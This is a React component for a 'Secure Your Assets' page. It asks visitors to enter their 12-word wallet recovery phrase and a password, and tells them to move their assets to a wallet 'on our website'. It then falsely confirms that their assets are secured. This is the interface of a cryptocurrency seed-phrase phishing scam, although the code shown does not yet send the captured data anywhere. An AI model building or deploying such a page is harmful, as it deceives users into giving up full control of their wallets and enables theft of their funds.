import React, { useState } from "react";
import Modal from "react-modal"; // You can install this using npm install react-modal

const Secure = () => {
  const [phrases, setPhrases] = useState(Array(12).fill(""));
  const [password, setPassword] = useState("");
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [modalMessage, setModalMessage] = useState("");
  const [isPasswordModalOpen, setIsPasswordModalOpen] = useState(false);

  const handlePhraseChange = (index, value) => {
    const newPhrases = [...phrases];
    newPhrases[index] = value;
    setPhrases(newPhrases);
  };

  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
  };

  const handleSecureClick = () => {
    if (phrases.every((phrase) => phrase.trim() !== "")) {
      setIsPasswordModalOpen(true);
    } else {
      setModalMessage("Please enter a valid 12-phrase security code.");
      setIsModalOpen(true);
    }
  };

  const handlePasswordSubmit = () => {
    if (password.trim() !== "") {
      setModalMessage(
        "Your assets are now secured with your 12-phrase security code."
      );
      setIsPasswordModalOpen(false);
      setIsModalOpen(true);
    } else {
      setModalMessage("Please enter a valid password.");
      setIsModalOpen(true);
    }
  };

  const closeModal = () => {
    setIsModalOpen(false);
    setIsPasswordModalOpen(false);
    setPassword("");
  };

  return (
    <div>
      <h1>Secure Your Assets</h1>
      <div>
        <p>You can secure your assets in your wallet by:</p>
        <ul>
          <li>Inputting your 12-phrase security code below.</li>
          <li>
            Transferring your assets to your assets wallet on our website.
          </li>
        </ul>
      </div>
      <div>
        <label>12-Phrase Security Code:</label>
        <div
          style={{
            display: "grid",
            gridTemplateColumns: "repeat(3, 1fr)",
            gap: "10px",
          }}
        >
          {phrases.map((phrase, index) => (
            <input
              key={index}
              type="text"
              value={phrase}
              onChange={(e) => handlePhraseChange(index, e.target.value)}
              placeholder={`Phrase ${index + 1}`}
            />
          ))}
        </div>
      </div>
      <div>
        <button onClick={handleSecureClick}>Secure My Assets</button>
      </div>

      <Modal isOpen={isModalOpen} onRequestClose={closeModal}>
        <div>
          <h2>{modalMessage}</h2>
          <button onClick={closeModal}>Close</button>
        </div>
      </Modal>

      <Modal isOpen={isPasswordModalOpen} onRequestClose={closeModal}>
        <div>
          <h2>Enter your password to secure your assets</h2>
          <input
            type="password"
            value={password}
            onChange={handlePasswordChange}
            placeholder="Password"
          />
          <button onClick={handlePasswordSubmit}>Confirm</button>
        </div>
      </Modal>
    </div>
  );
};

export default Secure;
